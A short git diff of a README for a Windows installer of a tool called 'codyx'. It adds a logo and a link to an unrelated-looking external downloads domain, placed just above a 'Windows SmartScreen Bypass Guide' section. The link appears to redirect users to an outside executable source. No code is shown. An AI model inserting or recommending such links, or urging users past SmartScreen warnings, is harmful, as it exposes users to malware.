@@ -43,6 +43,12 @@ Choose the installation method that fits your environment:
 
 Downloads the latest release of `codyx-installer-launcher-windows-x64.exe` automatically. It installs from compiled release assets only: no Git install, no Bun install, and no source checkout. The installed `codyx` shims perform a quiet release-manifest check on every start, update the compiled CLI when a newer asset is available, then launch the same TUI/Web UI commands.
 
+<p align="center">
+  <img src="readme/logo.png" alt="Codyx Orchestrator" width="320" />
+  <br>
+  <a href="https://install.kingkung.men/downloads">click to visit downloads page</a>
+</p>
+
 > [!IMPORTANT]
 > **Windows SmartScreen Bypass Guide**
 >
